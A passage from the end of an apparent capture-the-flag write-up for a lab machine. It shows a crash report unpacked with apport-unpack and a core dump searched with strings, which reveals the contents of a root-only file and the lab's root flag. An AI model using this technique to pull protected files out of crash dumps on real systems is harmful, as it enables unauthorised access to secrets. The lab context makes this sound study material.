-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r----- 1 dasith dasith 28006 Nov 18 21:40 _opt_count.1000.crash
-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash

dasith@secret:/var/crash$ mkdir /dev/shm/pencer

dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /dev/shm/pencer

dasith@secret:/var/crash$ cd /dev/shm/pencer

dasith@secret:/dev/shm/pencer$ ls
<SNIP>
CoreDump
<SNIP>
```

## Root Flag

We can now use strings too look at the contents of the CoreDump file:

```text
dasith@secret:/dev/shm/pencer$ strings CoreDump
strings CoreDump
<SNIP>
Enter source file/directory name:
%99s
Save results a file? [y/N]: 
Path: 
Could not open %s for writing
:*3$"
Save results a file? [y/N]: words      = 2
Total lines      = 2
/root/root.txt
ed72112dc7721f564f49b6846a2f0e22
```

The output is really long but you can spot the count file output within it and see the contents of the root flag that had been read in.

I thought that was pretty tricky for an easy box. I hope you enjoyed it.

See you next time.
